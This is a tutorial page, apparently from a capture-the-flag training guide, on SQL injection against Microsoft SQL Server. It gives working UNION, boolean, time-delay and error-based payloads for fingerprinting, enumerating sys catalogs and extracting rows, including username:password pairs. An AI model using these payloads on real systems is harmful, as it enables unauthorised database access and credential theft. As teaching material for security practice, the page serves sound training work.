---
title: "05 · SQLi — SQL Server"
weight: 14
bookToc: true
---

# Microsoft SQL Server SQLi

**Flow:** confirm T-SQL → identify database/schema → read `sys` catalogs → extract rows. First establish the [insertion context](../sqli/).

## 1. Fingerprint

Three-column UNION, second column text-compatible:

```sql
missing' UNION SELECT NULL,@@VERSION,NULL-- -
missing' UNION SELECT NULL,DB_NAME()+':'+SYSTEM_USER,NULL-- -
```

`@@VERSION` also exists in MySQL; inspect the actual returned product string. Errors mentioning `Unclosed quotation mark`, `SQL Server`, or `Conversion failed` support the fingerprint but are not all unique.

Useful fragments:

```sql
SELECT DB_NAME(),SCHEMA_NAME(),SYSTEM_USER,USER_NAME();
SELECT name FROM sys.databases;
```

Metadata visibility follows permissions. A database list can be incomplete.

## 2. Enumerate tables and columns

```sql
SELECT s.name,t.name
FROM sys.tables AS t
JOIN sys.schemas AS s ON s.schema_id=t.schema_id
ORDER BY s.name,t.name;

SELECT c.name,TYPE_NAME(c.user_type_id)
FROM sys.columns AS c
WHERE c.object_id=OBJECT_ID('dbo.users')
ORDER BY c.column_id;
```

Portable information schema alternative:

```sql
SELECT TABLE_SCHEMA,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
SELECT COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME='users';
```

For SQL Server 2017+:

```sql
missing' UNION SELECT NULL,STRING_AGG(CAST(s.name+'.'+t.name AS nvarchar(max)),','),NULL FROM sys.tables t JOIN sys.schemas s ON s.schema_id=t.schema_id-- -
```

If `STRING_AGG` is unavailable, request individual rows or use a version-appropriate XML concatenation expression. Do not mistake an unknown aggregation function for a failed injection.

## 3. Read rows and handle types

```sql
SELECT id,username,password FROM dbo.users ORDER BY id;
SELECT flag FROM dbo.flags;
SELECT CONCAT(CAST(id AS varchar(20)),':',username,':',password) FROM dbo.users;
```

Complete example:

```sql
missing' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM dbo.users-- -
```

`+` concatenates strings, but data type precedence can force numeric conversion. Explicit casts avoid that surprise. Use `varchar(max)` / `nvarchar(max)` for long values. `CONCAT` treats NULL values as empty strings; use `COALESCE` if NULL must be visible.

Read one row on SQL Server 2012+:

```sql
SELECT flag FROM dbo.flags ORDER BY id OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;
```

Older route for the first row:

```sql
SELECT TOP 1 flag FROM dbo.flags ORDER BY id;
```

## 4. Boolean predicates

```sql
LEN(DB_NAME())>5
ASCII(SUBSTRING(DB_NAME(),1,1))>109
EXISTS(SELECT 1 FROM sys.tables WHERE name='flags')
ASCII(SUBSTRING((SELECT TOP 1 flag FROM dbo.flags ORDER BY id),1,1))>109
```

`LEN()` excludes trailing spaces. For Unicode use `UNICODE(SUBSTRING(...))`; for bytes use a suitable binary cast and `DATALENGTH()`.

## 5. Conditional delay

`WAITFOR` is a statement, not a scalar function. These need a batch / stacked-statement path permitted by the driver:

```sql
1'; IF (1=1) WAITFOR DELAY '00:00:02'-- -
1'; IF (1=2) WAITFOR DELAY '00:00:02'-- -
1'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>109) WAITFOR DELAY '00:00:02'-- -
```

If multi-statement requests are rejected, prefer boolean or detailed conversion-error extraction. SQL Server `SLEEP()` is not the right primitive.

## 6. Error-based extraction

If database error text is returned to the client:

```sql
1 AND CONVERT(int,DB_NAME())=1
1 AND CONVERT(int,(SELECT TOP 1 flag FROM dbo.flags ORDER BY id))=1
```

A conversion error may include the offending value. Numeric-looking text may convert successfully. A generic `500` gives at most a boolean error signal. Check the actual exception body before assuming data was disclosed.

## Avoid blind alleys

- `xp_cmdshell` is normally disabled and requires strong privileges. SQLi does not imply OS execution.
- The SQL Server host may be separate from the web application.
- Square brackets quote identifiers: `[odd table]`. Single quotes quote text: `'admin'`.
- `dbo` is common, not guaranteed; enumerate schemas.
- A cast in the injected column cannot force the original UNION column to accept a different type.

Official references: [system catalog views](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/catalog-views-transact-sql), [STRING_AGG](https://learn.microsoft.com/en-us/sql/t-sql/functions/string-agg-transact-sql), [WAITFOR](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/waitfor-transact-sql).
